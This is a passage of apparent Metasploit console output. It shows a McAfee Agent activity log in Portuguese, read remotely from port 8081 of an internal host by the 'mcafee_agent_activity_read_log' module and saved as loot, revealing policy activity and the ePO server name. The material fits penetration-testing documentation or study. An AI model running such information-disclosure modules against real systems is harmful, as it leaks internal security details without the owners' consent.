type="3">Coletando propriedades</Log><Log component="8192" time="2015-05-13T11:54:05" type="3">O agente está procurando eventos a serem carregados</Log><Log component="8192" time="2015-05-13T11:54:05" type="3">Sessão de comunicação do agente iniciada</Log><Log component="8192" time="2015-05-13T11:54:05" type="3">Agente enviando pacote PROPS VERSION para o servidor ePO</Log><Log component="8192" time="2015-05-13T11:54:05" type="3">Agente conectando-se ao servidor ePO</Log><Log component="8192" time="2015-05-13T11:54:06" type="3">Pacote carregado no servidor ePO com êxito</Log><Log component="8192" time="2015-05-13T11:54:06" type="3">Sessão de comunicação do agente encerrada</Log><Log component="8192" time="2015-05-13T11:54:06" type="3">O agente recebeu pacote REQUEST PROPS do servidor ePO</Log><Log component="8192" time="2015-05-13T11:54:06" type="3">Sessão de comunicação do agente iniciada</Log><Log component="8192" time="2015-05-13T11:54:06" type="3">Agente enviando pacote INC PROPS para o servidor ePO</Log><Log component="8192" time="2015-05-13T11:54:06" type="3">Agente conectando-se ao servidor ePO</Log><Log component="8192" time="2015-05-13T11:54:06" type="3">Pacote carregado no servidor ePO com êxito</Log><Log component="8192" time="2015-05-13T11:54:06" type="3">Sessão de comunicação do agente encerrada</Log><Log component="8192" time="2015-05-13T11:54:06" type="3">O agente recebeu pacote POLICY do servidor ePO</Log><Log component="8192" time="2015-05-13T11:54:07" type="3">A nova política do servidor foi combinada com êxito</Log><Log component="8192" time="2015-05-13T11:54:07" type="3">Cumprindo políticas obtidas recentemente por download</Log><Log component="8192" time="2015-05-13T11:54:07" type="3">O agente iniciou o cumprimento de políticas</Log><Log component="2" time="2015-05-13T11:54:07" type="3">Cumprindo políticas para McAfee Agent</Log><Log component="2" time="2015-05-13T11:54:08" type="3">Cumprindo políticas para VIRUSCAN8800</Log><Log component="2" time="2015-05-13T11:54:08" type="3">Cumprindo políticas para EPOAGENT3000META</Log><Log component="2" time="2015-05-13T11:54:08" type="3">Cumprindo políticas para EPOAGENT3000</Log><Log component="8192" time="2015-05-13T11:54:08" type="3">O agente concluiu o cumprimento das políticas</Log><Log component="8192" time="2015-05-13T11:54:08" type="3">Próximo cumprimento de política em 30 minutos</Log><Log component="8192" time="2015-05-13T12:14:05" type="3">O agente está procurando eventos a serem carregados</Log><Log component="8192" time="2015-05-13T12:24:08" type="3">O agente iniciou o cumprimento de políticas</Log><Log component="2" time="2015-05-13T12:24:08" type="3">Cumprindo políticas para McAfee Agent</Log><Log component="2" time="2015-05-13T12:24:09" type="3">Cumprindo políticas para VIRUSCAN8800</Log><Log component="2" time="2015-05-13T12:24:09" type="3">Cumprindo políticas para EPOAGENT3000META</Log><Log component="2" time="2015-05-13T12:24:09" type="3">Cumprindo políticas para EPOAGENT3000</Log><Log component="8192" time="2015-05-13T12:24:09" type="3">O agente concluiu o cumprimento das políticas</Log><Log component="8192" time="2015-05-13T12:24:09" type="3">Próximo cumprimento de política em 30 minutos</Log><Log component="8192" time="2015-05-13T12:34:05" type="3">O agente está procurando eventos a serem carregados</Log><Log component="8192" time="2015-05-13T12:54:05" type="3">O agente está procurando eventos a serem carregados</Log><Log component="8192" time="2015-05-13T12:54:09" type="3">O agente iniciou o cumprimento de políticas</Log><Log component="2" time="2015-05-13T12:54:09" type="3">Cumprindo políticas para McAfee Agent</Log><Log component="2" time="2015-05-13T12:54:11" type="3">Cumprindo políticas para VIRUSCAN8800</Log><Log component="2" time="2015-05-13T12:54:11" type="3">Cumprindo políticas para EPOAGENT3000META</Log><Log component="2" time="2015-05-13T12:54:11" type="3">Cumprindo políticas para EPOAGENT3000</Log><Log component="8192" time="2015-05-13T12:54:11" type="3">O agente concluiu o cumprimento das políticas</Log><Log component="8192" time="2015-05-13T12:54:11" type="3">Próximo cumprimento de política em 30 minutos</Log><Log component="8192" time="2015-05-13T13:14:05" type="3">O agente está procurando eventos a serem carregados</Log><Log component="8192" time="2015-05-13T13:24:11" type="3">O agente iniciou o cumprimento de políticas</Log><Log component="2" time="2015-05-13T13:24:11" type="3">Cumprindo políticas para McAfee Agent</Log><Log component="2" time="2015-05-13T13:24:12" type="3">Cumprindo políticas para VIRUSCAN8800</Log><Log component="2" time="2015-05-13T13:24:12" type="3">Cumprindo políticas para EPOAGENT3000META</Log><Log component="2" time="2015-05-13T13:24:12" type="3">Cumprindo políticas para EPOAGENT3000</Log><Log component="8192" time="2015-05-13T13:24:12" type="3">O agente concluiu o cumprimento das políticas</Log><Log component="8192" time="2015-05-13T13:24:12" type="3">Próximo cumprimento de política em 30 minutos</Log><Log component="8192" time="2015-05-13T13:34:05" type="3">O agente está procurando eventos a serem carregados</Log><Log component="8192" time="2015-05-13T13:54:05" type="3">O agente está procurando eventos a serem carregados</Log><Log component="8192" time="2015-05-13T13:54:12" type="3">O agente iniciou o cumprimento de políticas</Log><Log component="2" time="2015-05-13T13:54:12" type="3">Cumprindo políticas para McAfee Agent</Log><Log component="2" time="2015-05-13T13:54:14" type="3">Cumprindo políticas para VIRUSCAN8800</Log><Log component="2" time="2015-05-13T13:54:14" type="3">Cumprindo políticas para EPOAGENT3000META</Log><Log component="2" time="2015-05-13T13:54:14" type="3">Cumprindo políticas para EPOAGENT3000</Log><Log component="8192" time="2015-05-13T13:54:14" type="3">O agente concluiu o cumprimento das políticas</Log><Log component="8192" time="2015-05-13T13:54:14" type="3">Próximo cumprimento de política em 30 minutos</Log><Log component="8192" time="2015-05-13T14:14:05" type="3">O agente está procurando eventos a serem carregados</Log><ePOServerName>CMZGAVS06</ePOServerName></naLog>
[+] 10.198.44.56:8081 - File saved in: /root/.msf4/loot/20150513141717_default_10.198.44.56_mcafee_log_301519.txt
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf auxiliary(mcafee_agent_activity_read_log) >
```
---
